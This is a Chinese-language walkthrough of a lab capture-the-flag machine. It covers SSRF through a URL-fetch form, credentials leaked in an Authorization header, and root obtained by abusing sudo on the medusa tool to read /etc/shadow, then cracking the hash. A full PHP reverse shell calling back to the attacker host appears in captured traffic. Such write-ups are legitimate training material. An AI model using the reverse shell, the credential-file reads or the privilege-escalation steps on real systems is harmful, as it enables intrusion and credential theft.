![image-20250707214716346](https://7r1umphk.github.io/image/20250707214716465.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l                    
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.167 08:00:27:f0:d8:81       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e7:e4:00       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 4 responded
```

167的

探测一下服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.167
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 09:30 EDT
Nmap scan report for 192.168.205.167
Host is up (0.00010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:F0:D8:81 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
```

看看80

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.167
<!DOCTYPE html>
<html>
<head>
    <title>HTTP Requester</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
        }
        form {
            margin: 20px 0;
            display: flex;
            gap: 10px;
        }
        input[type="text"] {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
        .result-box {
            margin-top: 20px;
            padding: 15px;
            background-color: #f9f9f9;
            border-left: 4px solid #ccc;
        }
        nav {
            margin-top: 30px;
            display: flex;
            gap: 15px;
        }
        nav a {
            padding: 8px 16px;
            background-color: #e0e0e0;
            border-radius: 4px;
            text-decoration: none;
            color: #333;
        }
        nav a:hover {
            background-color: #d0d0d0;
        }
        pre {
            max-height: 300px;
            overflow: auto;
            padding: 15px;
            background-color: #f8f8f8;
            border: 1px solid #e0e0e0;
            border-radius: 4px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Website Request Tool</h1>
        <form method="POST">
            <input type="text" name="url" placeholder="Enter URL starting with http" required>
            <button type="submit">Fetch Content</button>
        </form>
        
        <div class="result-box">
            <h3>Current target:</h3>
            No request made        </div>
        
        <div class="result-box">
            <h3>Response:</h3>
                            <p>Submit URL to test connection</p>
                    </div>
        
        <nav>
            <a href="home.php">Home</a>
            <a href="about.php">About</a>
            <a href="dashboard.php">Dashboard</a>
        </nav>
    </div>
</body>
</html>
```

![image-20250707214425237](https://7r1umphk.github.io/image/20250707214432940.webp)

尝试访问反弹shell

![image-20250707214553039](https://7r1umphk.github.io/image/20250707214553216.webp)

没解析

查看本地文件

![image-20250707214628218](https://7r1umphk.github.io/image/20250707214628414.webp)

看了home，about，dashboard，还尝试了一下167的ip，都没有什么东西

抓个包看看

![image-20250707214846154](https://7r1umphk.github.io/image/20250707214846404.webp)

没啥东西

然后这里测试了很多，后面发现是它发送的头有东西

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo tcpdump -A host 192.168.205.167
[sudo] kali 的密码：
对不起，请重试。
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
09:50:18.143873 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [S], seq 1359019690, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
E..4.
@..............7.PQ...........................
09:50:18.144240 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [S.], seq 1762610671, ack 1359019691, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
E..4..@.@............P.7i.M.Q.......c...............
09:50:18.144526 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
E..(..@..............7.PQ...i.M.P.............
09:50:18.144722 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [P.], seq 1:557, ack 1, win 513, length 556: HTTP: POST / HTTP/1.1
E..T..@..............7.PQ...i.M.P...S...POST / HTTP/1.1
Host: 192.168.205.167
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://192.168.205.167
Connection: keep-alive
Referer: http://192.168.205.167/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F127.0.0.1
09:50:18.144954 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [.], ack 557, win 501, length 0
E..(@.@.@..9.........P.7i.M.Q...P.............
09:50:18.147613 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [P.], seq 1:1381, ack 557, win 501, length 1380: HTTP: HTTP/1.1 200 OK
E...@.@.@............P.7i.M.Q...P....w..HTTP/1.1 200 OK
Date: Mon, 07 Jul 2025 13:50:18 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1127
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

...........XKo.6...W.
...*....*.. ..=.. ..(..h...J...b.E.{....(.m....!.9..f8.....w....>...(..,n.`..3 .X.....r......s.Y..Y#..K....E/...S=kZ
.....D..............%[...%Hd......p.mH.......Z..".&.W.m+...a...........jtb..o....I......mF.>..e.3.ADj.....|.AD....j.B....
~;{..e...r...6^..s'......6.iN.8...I+.Z.u.......1.......^.P&.:...l`5m..U-~./.....        ..a.I}r..q...!W.. ..........*.p,......... \..../i.\q..:k.....R^.i...>.q....pv..y...u.d...9..Z..J...1..... .x-t..3N.........G._M..;W..8.*7......x..?;uui|.S.. .l...,.........RS1<
...0.dB.z.kep...x....(7j.Z..Mx...y.S.)..-....8.w.80=6V.r.H.y.i.9.....u.5.......L.....\.
{R...Xd..y..>/{*.....WH.....f..dN.8..t..{......G..dB..l..$Y.....@.F...bh..zU..%..H3. .....#...(..w...IWI..e...fL......H.dn.).Q..W?\...;.......yEK..6.O,."....E..6..L...2=....&4.R36.SKA..J.4kg.s.e'^..y.....D.5.............C;...fh..v.S...X}.>j...(....).i5a..C5.br.X8...tF..u........dC...d|..>.3S...~SC....4.......8.v.......5k-.........jz..M....?Q..:.."la...
..VN..>J.RR.u...        *k.D-S....)Z[5..u.d.q.. cx..3....................~..... .V.2d.x.L;....kV Lr6...H...@.zg0'.ZHC...{.^.8/Q...8!...Kth.%.`xI..kG........0.../....I..*...
09:50:18.197232 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [.], ack 1381, win 507, length 0
E..(..@..............7.PQ...i.STP.............
09:50:22.378643 IP 192.168.205.167.bootpc > 192.168.205.254.bootps: BOOTP/DHCP, Request from 08:00:27:f0:d8:81 (oui Unknown), length 300
E..H..@.@............D.C.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5....Basic7.......w.,/.y*=..'......./l....'-.H..............
09:50:22.379024 IP 192.168.205.254.bootps > 192.168.205.167.bootpc: BOOTP/DHCP, Reply, length 300
E..H.................C.D.4......%.      :......................'.............................................................................................................................................................................................................c.Sc5..6.....3.........................localdomain......,.......
09:50:23.159139 IP 192.168.205.167.http > 192.168.205.1.60727: Flags [F.], seq 1381, ack 557, win 501, length 0
E..(@.@.@..7.........P.7i.STQ...P.... ........
09:50:23.159439 IP 192.168.205.1.60727 > 192.168.205.167.http: Flags [.], ack 1382, win 507, length 0
E..(..@..............7.PQ...i.SUP.............
09:50:23.999242 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [S], seq 2328306649, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
E..4..@..............F.P..#.........................
09:50:23.999577 IP 192.168.205.167.http > 192.168.205.1.60742: Flags [S.], seq 4258427036, ack 2328306650, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
E..4..@.@............P.F..p...#.....Mn..............
09:50:23.999823 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [.], ack 1, win 513, length 0
E..(..@..............F.P..#...p.P....0........
09:50:23.999943 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [P.], seq 1:573, ack 1, win 513, length 572: HTTP: POST / HTTP/1.1
E..d..@..............F.P..#...p.P.......POST / HTTP/1.1
Host: 192.168.205.167
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Origin: http://192.168.205.167
Connection: keep-alive
Referer: http://192.168.205.167/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

url=http%3A%2F%2F192.168.205.128%2Freverse.php
09:50:24.000119 IP 192.168.205.167.http > 192.168.205.1.60742: Flags [.], ack 573, win 501, length 0
E..(.Q@.@.s..........P.F..p...&.P.............
09:50:24.000772 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [S], seq 726111212, win 64240, options [mss 1460,sackOK,TS val 2885018455 ecr 0,nop,wscale 7], length 0
E..<..@.@.G5...........P+G..........D..........
...W........
09:50:24.000797 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [S.], seq 2197022970, ack 726111213, win 65160, options [mss 1460,sackOK,TS val 1602276764 ecr 2885018455,nop,wscale 7], length 0
E..<..@.@..C.........P......+G.................
_......W....
09:50:24.000931 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 0
E..4..@.@.G<...........P+G...........W.....
...X_...
09:50:24.000978 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [P.], seq 1:153, ack 1, win 502, options [nop,nop,TS val 2885018456 ecr 1602276764], length 152: HTTP: GET /reverse.php HTTP/1.1
E.....@.@.F............P+G..........x0.....
...X_...GET /reverse.php HTTP/1.1
Host: 192.168.205.128
Accept: */*
Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==


09:50:24.000983 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [.], ack 153, win 508, options [nop,nop,TS val 1602276764 ecr 2885018456], length 0
E..4.9@.@.|..........P......+G.............
_......X
09:50:24.002659 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [P.], seq 1:203, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018456], length 202: HTTP: HTTP/1.0 200 OK
E....:@.@.{F.........P......+G.......j.....
_......XHTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.13.3
Date: Mon, 07 Jul 2025 13:50:24 GMT
Content-type: application/octet-stream
Content-Length: 2596
Last-Modified: Thu, 26 Jun 2025 12:22:10 GMT


09:50:24.002881 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [.], ack 203, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G:...........P+G.................
...Z_...
09:50:24.003021 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [P.], seq 203:2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 2596: HTTP
E.
X.;@.@.q..........P......+G......&......
_......Z<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.205.128';
$port = 8888;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>

09:50:24.003100 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [F.], seq 2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 0
E..4.=@.@.|..........P......+G.............
_......Z
09:50:24.003289 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [.], ack 2799, win 496, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G9...........P+G.................
...Z_...
09:50:24.003466 IP 192.168.205.167.40214 > 192.168.205.128.http: Flags [F.], seq 153, ack 2800, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
E..4..@.@.G8...........P+G.................
...Z_...
09:50:24.003474 IP 192.168.205.128.http > 192.168.205.167.40214: Flags [.], ack 154, win 508, options [nop,nop,TS val 1602276767 ecr 2885018458], length 0
E..4.>@.@.|..........P......+G.............
_......Z
09:50:24.003898 IP 192.168.205.167.http > 192.168.205.1.60742: Flags [P.], seq 1:2113, ack 573, win 501, length 2112: HTTP: HTTP/1.1 200 OK
E....R@.@............P.F..p...&.P.......HTTP/1.1 200 OK
Date: Mon, 07 Jul 2025 13:50:24 GMT
Server: Apache/2.4.62 (Debian)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 1859
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

...........X}o.6...|.....R!@..G.[....M...6M..L........n....v.!.J7R)........W..n.~...H'.UcT.(    .....f:.W....aB?gTi*G.[u.J?...7.....z5.Pp.      I...!\KF..P.........    Yv.,....z.tY..s.....i.... `|>........Rd<..".r...ss......>.K.....6."b........I..)To{..Q.   ..(8H..G....i.N.....D...Q.-OOOke.       .E2.L..Y..)..dE..Ph.<.2../.dl..M...4&..aL+...t7...L...R:nj.....Q.xx|.;.;..;k..A..eg...2.........<..~.^1..H+......Km13..h*..t...0._.H..g..w..6.$UY.1...1..".......I....5BLCmMP....:A9..G..-......X1|..P.09...
...^.u.4...B....5.S[6*....A.\u0..[.^v"...6....a...,..............6C;*%>...;.I...#/..#....i.y#....c....jA.uc.E....L!......1B.KT..'TG".7..>=. ,.-.P*.....3.7.c....Q.q..T..e.3(M.F3.......6A..L.....C...Y.t..=.~.7...z.9.....z...(.d]I..E.W7....(...!..t...<....A...Ew.;.......[.v.(]..L..,..R.......a.\....w(@...o.\&..h.C....v.>....1MP[.......}....E...,Mi.Z..Y.L........5.BKH......,.1.w...'.R|..J...O..D^B......u....4....6.........[.S.h(...%t.......9...N>.x.....s&.e..s...R...w....S..$.......o~....b.S\...0.....iJp.gq..TJ!.......d
t.%,........fDE.a+......2,.:.....Bh......t..V-w*...........
yt.b1..z..V9j....7.N.....{9.-g....n2.......m....r.-3L.}-#:,....@o...XfMYjC.
..St.bA..G.c..9.3;dA.W..Q.+.X.nQ...z....?..=a..tw.a..<DL..a..b.1m.      ....%.&qw..y.Q.d...6......D..w....;BrN..1D...........y.6.......c^.`{C<c.W.`{[....b..,.2.....|.s-.J....).S........e....,...$.&...X7+.m....!.........8...i .eA(Eb...b..2..{.s.I..5L./b...4..L.w.S)|...5|.:/..G.m..x.AU;..WLM...L..U..k....8+,8X6.>.(.$1i6...,..[.....N.D.....$.}$&<.vcS.O.o...B>...&`...^b:b..m...    '..B..
[......."...:.p..       .D..TDf..c^B...%../B.Y.c...E....T2.....1.....>....b...+...T+...yGr..........Z.O7....~.........n~...........t.....QZ...Cp(%...P.TG..yg.F.l..........)....E..Rn.g...L.......T.D~.:.P..B...X....Z.o/.....X.."Fq1.....f^..UUx.O.....|N.'/.@'.w.E.....k....=~.V.w........~.4.>...#;.....#.6..)...g...Q.+^7N...H....d...[..o._$..C....
09:50:24.004210 IP 192.168.205.1.60742 > 192.168.205.167.http: Flags [.], ack 2113, win 513, length 0
E..(..@..............F.P..&...x.P...|.........
^C
30 packets captured
30 packets received by filter
0 packets dropped by kernel
                     
```

Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==



base64解一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==' |base64 -d
cnhyk:bcf829627eea364a3abc41a6537fbf543e974ff8                                  
```

登录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh cnhyk@192.168.205.167           
The authenticity of host '192.168.205.167 (192.168.205.167)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.167' (ED25519) to the list of known hosts.
cnhyk@192.168.205.167's password: 
Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cnhyk@Basic:~$ id
uid=1000(cnhyk) gid=1000(cnhyk) groups=1000(cnhyk)
cnhyk@Basic:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for cnhyk: 
Sorry, user cnhyk may not run sudo on Basic.
```

找提权点

```
cnhyk@Basic:~$ cat user.txt 
flag{user-df31759540dc28f75a20f443a19b1148}
cnhyk@Basic:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
cnhyk@Basic:~$ ss -tulnp
Netid               State                Recv-Q               Send-Q                             Local Address:Port                               Peer Address:Port               
udp                 UNCONN               0                    0                                        0.0.0.0:68                                      0.0.0.0:*                  
tcp                 LISTEN               0                    128                                      0.0.0.0:22                                      0.0.0.0:*                  
tcp                 LISTEN               0                    128                                         [::]:22                                         [::]:*                  
tcp                 LISTEN               0                    128                                            *:80                                            *:*                  
cnhyk@Basic:~$ cd /opt/
cnhyk@Basic:/opt$ ls -al
total 28
drwxr-xr-x  2 root root  4096 Jul  6 09:21 .
drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
-rwx--x--x  1 root root 17016 Jul  6 09:21 jojo
cnhyk@Basic:/opt$ ./jojo 
问题 1: 请输入 80+87
80+87
正确！
问题 2: 请输入 57+91
^C
```

我愿称之为伪人测试，哈哈哈（纯开玩笑，没有冒犯的意思）

```
cnhyk@Basic:/tmp$ cat a.py 
cat a.py 
#!/usr/bin/env python3
import subprocess
import sys

JOJO_EXECUTABLE = "/opt/jojo"

def slv():
    print(f"[+] 正在启动目标程序: {JOJO_EXECUTABLE}")

    try:
        cmd = ['stdbuf', '-oL', JOJO_EXECUTABLE]
        p = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        print(f"[!] 错误：找不到程序 '{JOJO_EXECUTABLE}' 或 'stdbuf'。请检查。")
        sys.exit(1)

    print("[+] 连接成功！开始自动化交互...\n")

    while True:
        l = p.stdout.readline()
        if not l:
            break
        print(l.strip())

        if "请输入" in l:
            try:
                q = l.split("请输入 ")[1].strip()
                ans = q
                print(f"[*] 检测到问题，提取内容: {ans}")
                print(f"[*] 自动输入: {ans}")
                p.stdin.write(ans + '\n')
                p.stdin.flush()
                print("-" * 20)
            except IndexError:
                print("[!] 警告：无法从行中解析问题。")

    p.wait()
    print(f"\n[+] 交互结束。程序退出，返回码: {p.returncode}")

if __name__ == "__main__":
    slv()
```

执行

```
cnhyk@Basic:/tmp$ python3 $_
python3 $_
[+] 正在启动目标程序: /opt/jojo
[+] 连接成功！开始自动化交互...

问题 1: 请输入 61+34
[*] 检测到问题，提取内容: 61+34
[*] 自动输入: 61+34
--------------------
省略
--------------------
正确！
问题 500: 请输入 95+68
[*] 检测到问题，提取内容: 95+68
[*] 自动输入: 95+68
--------------------
正确！
jojo:jojo

[+] 交互结束。程序退出，返回码: 0
```

jojo:jojo，啊这所以我一开始测试弱密码就不用写代码了......

```
jojo@Basic:/tmp$ id
uid=1001(jojo) gid=1001(jojo) groups=1001(jojo)
jojo@Basic:/tmp$ sudo -l
Matching Defaults entries for jojo on Basic:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jojo may run the following commands on Basic:
    (ALL) NOPASSWD: /usr/bin/medusa
```

显而易见了，这是一个密码爆破工具，所以它读取字典大概是有问题的

```
jojo@Basic:/tmp$ sudo /usr/bin/medusa --help
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

/usr/bin/medusa: invalid option -- '-'
CRITICAL: Unknown error processing command-line options.
ALERT: User logon information must be supplied.

Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
                 different parameter each time and they will all be sent to the module (i.e.
                 -m Param1 -m Param2, etc.)
  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process 
                 the entire username before proceeding.
  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module's usage information
  -v [NUM]     : Verbose level [0 - 6 (more)]
  -w [NUM]     : Error debug level [0 - 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan
```

利用

```
jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /root/root.txt -v 64
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 1
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 1
GENERAL: Total Passwords: 1
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: flag{root-c065860911bb44a2483c096cbd203df9} (1 of 1 complete)
GENERAL: Medusa has finished.
jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /etc/shadow -v 64
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 1
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 1
GENERAL: Total Passwords: 27
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: root:$6$sshVeDa7z638dY8S$ZrwHy6TQ8VMkgSx1mGhCPG8Lffedn9LbDPcgCoQdF877zeXPR.NGhm20RlipL5s0HfPQByfwXyVXnM1giQ9tX0:20275:0:99999:7::: (1 of 27 complete)
^CALERT: Medusa received SIGINT - Sending notification to login threads that we are are aborting.
ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: daemon:*:20166:0:99999:7::: (2 of 27 complete)
ALERT: To resume scan, add the following to your original command: "-Z h1u1."
```

爆破hash

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                         
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
budayday         (root)     
1g 0:00:00:36 DONE (2025-07-07 11:16) 0.02707g/s 27110p/s 27110c/s 27110C/s buldogs..brittany_
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

所以说

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ grep -w -n 'budayday' /usr/share/wordlists/rockyou.txt                                                                                                
999993:budayday
                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'budayday' > pass                                                                                                        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh root@192.168.205.167                                       
root@192.168.205.167's password: 
Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul  6 08:23:47 2025 from 192.168.3.94
root@Basic:~# id
uid=0(root) gid=0(root) groups=0(root)
```

你硬跑应该跑的出来，我浅跑了500行没有限制

